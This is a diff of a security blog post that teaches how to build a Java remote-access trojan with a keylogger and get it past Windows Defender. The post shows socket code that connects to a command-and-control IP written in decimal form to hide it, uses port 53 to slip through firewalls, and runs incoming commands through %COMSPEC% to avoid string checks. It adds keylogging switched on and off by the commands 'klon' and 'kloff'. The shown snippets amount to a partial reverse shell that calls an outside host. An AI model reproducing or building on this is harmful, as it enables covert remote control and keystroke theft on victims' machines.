@@ -9,18 +9,18 @@
     <meta property="og:image:height" content="630" />
 
     <!-- Begin Jekyll SEO tag v2.6.1 -->
-<title>Evading AV with Java Sockets | Arti Karahoda</title>
-<meta name="generator" content="Jekyll v3.8.6" />
-<meta property="og:title" content="Evading AV with Java Sockets" />
+<title>Evading AV with Network Sockets / Shell &amp; Keylogger | Arti Karahoda</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Evading AV with Network Sockets / Shell &amp; Keylogger" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="Cyber Security &amp; Data Protection" />
-<meta property="og:description" content="Cyber Security &amp; Data Protection" />
-<link rel="canonical" href="https://artikrh.github.io/posts/network-sockets-revshell.html" />
-<meta property="og:url" content="https://artikrh.github.io/posts/network-sockets-revshell.html" />
+<meta name="description" content="Compiling and running an unsigned Windows executable and hoping for a remote command session without any detection is a difficult task to achieve, however, sometimes there are easier ways of bypassing AVs. This article will outline a simple but functional remote ‘shell’ with keylogging capabilities against a fully up-to-date Windows Defender." />
+<meta property="og:description" content="Compiling and running an unsigned Windows executable and hoping for a remote command session without any detection is a difficult task to achieve, however, sometimes there are easier ways of bypassing AVs. This article will outline a simple but functional remote ‘shell’ with keylogging capabilities against a fully up-to-date Windows Defender." />
+<link rel="canonical" href="https://artikrh.github.io/posts/av-evasion-network-sockets.html" />
+<meta property="og:url" content="https://artikrh.github.io/posts/av-evasion-network-sockets.html" />
 <meta property="og:site_name" content="Arti Karahoda" />
-<meta property="og:image" content="https://artikrh.github.io/assets/images/JavaSockets.png" />
+<meta property="og:image" content="https://artikrh.github.io/assets/images/Keylogger2.png" />
 <script type="application/ld+json">
-{"@type":"WebPage","image":"https://artikrh.github.io/assets/images/JavaSockets.png","url":"https://artikrh.github.io/posts/network-sockets-revshell.html","description":"Cyber Security &amp; Data Protection","headline":"Evading AV with Java Sockets","@context":"https://schema.org"}</script>
+{"@type":"WebPage","image":"https://artikrh.github.io/assets/images/Keylogger2.png","url":"https://artikrh.github.io/posts/av-evasion-network-sockets.html","description":"Compiling and running an unsigned Windows executable and hoping for a remote command session without any detection is a difficult task to achieve, however, sometimes there are easier ways of bypassing AVs. This article will outline a simple but functional remote ‘shell’ with keylogging capabilities against a fully up-to-date Windows Defender.","headline":"Evading AV with Network Sockets / Shell &amp; Keylogger","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
     <meta property="og:type" content="article">
@@ -459,25 +459,25 @@ body .gist .pl-iu {
 
 </style>
 
-<p><i><strong>06 August, 2020</strong> — <a href="../">Go back to homepage</a></i></p>
-<h1 id="evading-av-with-network-sockets--java-se">Evading AV with Network Sockets / Java SE</h1>
+<p><i><strong>31 August, 2020</strong> — <a href="../">Go back to homepage</a></i></p>
+<h1 id="evading-av-with-network-sockets--shell--keylogger">Evading AV with Network Sockets / Shell &amp; Keylogger</h1>
 
-<p>RAT trojans typically use WinAPI functions for injecting malicious shellcode in memory (RAM) which is then executed. While there are numerous methods of evading anti-malware or EDR solutions for such RATs that reside in disk using techniques such as partial code encryption, they can still be caught during runtime as a result of vendors using behaviour analysis through machine learning for exploit prevention. Such controlls are difficult to bypass, however, instead of leveraging WinAPI calls, sometimes simplicity is key.</p>
+<p>RAT trojans typically use WinAPI functions for injecting malicious shellcode in memory (RAM) which is then executed. While there are numerous methods of evading anti-malware or EDR solutions for such RATs that reside in disk using techniques such as partial code encryption, they can still be caught during runtime as a result of vendors using behaviour analysis through machine learning for exploit prevention. Such controlls are difficult to bypass, however, instead of leveraging WinAPI calls this time, sometimes simplicity is key.</p>
 
 <p>A network socket is an endpoint of a two-way communication (TCP or UDP), identified by an IP address and a port number, which is used to send or receive data within a node on a computer network (could be LAN, WAN). They have a wide range of use cases, usually in a client-server architecture such as basic chat applications. A lot of programming languages implement libraries for programming sockets, and in this case, I will be using Java considering that it can be complied to bytecode in almost all operating systems which have JVM. Furthermore, its compile logic makes most of the Java applications seem legitimate, such as our case in programming a RAT trojan with a simple keylogging capability.</p>
 
-<p>Unfortunately, in comparison with Python, Java requires more lines of code for using sockets. For demonstration purposes, I will be using one of my VPS servers as the listener IP address of <code class="highlighter-rouge">91.92.136.11</code>, which can be written in decimal format as <code class="highlighter-rouge">"1532790795"</code> thanks to <a href="https://github.com/C-REMO/Obscure-IP-Obfuscator">IP-Obfuscator.py</a>:</p>
+<p>Unfortunately, in comparison with Python, Java requires more lines of code for using sockets. For demonstration purposes, I will be using one of my VPS servers as the listener IP address of <code class="language-plaintext highlighter-rouge">185.141.61.227</code>, which can be written in decimal format as <code class="language-plaintext highlighter-rouge">"3113041379"</code> thanks to <a href="https://github.com/C-REMO/Obscure-IP-Obfuscator">IP-Obfuscator.py</a>:</p>
 
-<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="nc">Socket</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Socket</span><span class="o">(</span><span class="s">"1532790795"</span><span class="o">,</span> <span class="mi">53</span><span class="o">);</span></code></pre></figure>
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="nc">Socket</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Socket</span><span class="o">(</span><span class="s">"3113041379"</span><span class="o">,</span> <span class="mi">53</span><span class="o">);</span></code></pre></figure>
 
-<p>This will initiate a communication channel with the CNC server, so you need a listener program such as netcat (for the sake of demonstration) operating in port 53 – a common port found in malware as it is mainly allowed in firewalls and typically not scrutinized enough from a security perspective. Sockets in Java also require input and output streams for basic I/O operations, as well as <code class="highlighter-rouge">PrintWriter()</code> and <code class="highlighter-rouge">BufferedReader()</code> to properly write outward data.</p>
+<p>This will initiate a communication channel with the CNC server, so you need a listener program such as netcat (for the sake of demonstration) operating in port 53 – a common port found in malware as it is mainly allowed in firewalls and typically not scrutinized enough from a security perspective. Sockets in Java also require input and output streams for basic I/O operations, as well as <code class="language-plaintext highlighter-rouge">PrintWriter()</code> and <code class="language-plaintext highlighter-rouge">BufferedReader()</code> to properly write outward data.</p>
 
 <figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="nc">InputStream</span> <span class="n">i</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
 <span class="nc">OutputStream</span> <span class="n">o</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span>
 <span class="nc">PrintWriter</span> <span class="n">pw</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PrintWriter</span><span class="o">(</span><span class="n">o</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
 <span class="nc">BufferedReader</span> <span class="n">rr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nc">InputStreamReader</span><span class="o">(</span><span class="n">i</span><span class="o">));</span></code></pre></figure>
 
-<p>Since our target OS is Windows, we will use the <code class="highlighter-rouge">%COMSPEC</code> environment variable which simply points to <code class="highlighter-rouge">C:\WINDOWS\system32\cmd.exe</code> – useful in bypassing string-referenced checks – to execute incoming data from a non-empty buffer:</p>
+<p>Since our target OS is Windows, we will use the <code class="language-plaintext highlighter-rouge">%COMSPEC%</code> environment variable which simply points to <code class="language-plaintext highlighter-rouge">C:\WINDOWS\system32\cmd.exe</code> – useful in bypassing string-referenced checks – to execute incoming data from a non-empty buffer:</p>
 
 <figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="nc">String</span> <span class="n">inc</span><span class="o">,</span> <span class="n">comSpec</span> <span class="o">=</span> <span class="nc">System</span><span class="o">.</span><span class="na">getenv</span><span class="o">(</span><span class="s">"comSpec"</span><span class="o">)</span> <span class="o">+</span> <span class="s">" /c "</span><span class="o">;</span>
 
@@ -491,13 +491,27 @@ body .gist .pl-iu {
     <span class="o">}</span>
 <span class="o">}</span></code></pre></figure>
 
-<p>We will also use the Path object to send the current working directory before command output for readability and convenience. The full source code is as follows:</p>
+<p>Furthermore, we will also use the Path object to send the current working directory before command output for readability and convenience:</p>
 
-<script src="https://gist.github.com/artikrh/fb4b51a99d5c7fb1f0ea4339c76bec39.js"></script>
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="nc">Path</span> <span class="n">crp</span> <span class="o">=</span> <span class="nc">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">""</span><span class="o">);</span>
+<span class="nc">String</span> <span class="n">rp</span> <span class="o">=</span> <span class="n">crp</span><span class="o">.</span><span class="na">toAbsolutePath</span><span class="o">().</span><span class="na">toString</span><span class="o">();</span></code></pre></figure>
 
-<p>Compiling this Java program into a Windows Excecutable comprises of convering <code class="highlighter-rouge">.jar</code> to <code class="highlighter-rouge">.exe</code> using <a href="https://stackoverflow.com/questions/2011664/compiling-a-java-program-into-an-executable">various tools</a>, however, I will be using the IntelliJ IDE to <a href="https://www.youtube.com/watch?v=_KHCHiH2RZ0">directly build a binary artifact</a> and run the program with a fully up-to-date Windows Defender:</p>
+<p>To add keylogging capabilities in real-time through sockets, I used the <a href="https://logging.apache.org/log4j/2.x/">log4j</a> API utility to capture user keystrokes. After integration, the full source code is as follows:</p>
 
-<p><img src="/assets/images/JavaSockets.png" alt="Proof of Concept" /></p>
+<script src="https://gist.github.com/artikrh/9fe78a9c3ecca773be4ab8e4f200c043.js"></script>
+
+<p>Compiling this Java program into a Windows Excecutable comprises of convering <code class="language-plaintext highlighter-rouge">.jar</code> to <code class="language-plaintext highlighter-rouge">.exe</code> using <a href="https://stackoverflow.com/questions/2011664/compiling-a-java-program-into-an-executable">various tools</a>, however, I will be using the IntelliJ IDE to <a href="https://www.youtube.com/watch?v=_KHCHiH2RZ0">directly build a binary artifact</a> and run the program along a fully up-to-date Windows Defender. The <code class="language-plaintext highlighter-rouge">klon</code> keyword will triger the keylogging capability, whereas <code class="language-plaintext highlighter-rouge">kloff</code> will stop the key listener:</p>
+
+<p><img src="/assets/images/Keylogger.png" alt="Proof of Concept" /></p>
+
+<p>Used libraries:</p>
+<ul>
+  <li>jnativehook-2.1.0.jar</li>
+  <li>log4j-api-2.10.0.jar</li>
+  <li>log4j-core-2.10.0.jar</li>
+  <li>log4j-slf4j-impl-2.10.0.jar</li>
+  <li>slf4j-api-1.8.0-alpha2.jar</li>
+</ul>
 
 <p><i><b>Disclaimer:</b> Usage of this application for attacking targets without prior mutual consent is illegal. It is the end user’s responsibility to obey all applicable local, state and federal laws. I assume no liability and I am not responsible for any misuse or damage caused.</i></p>
 
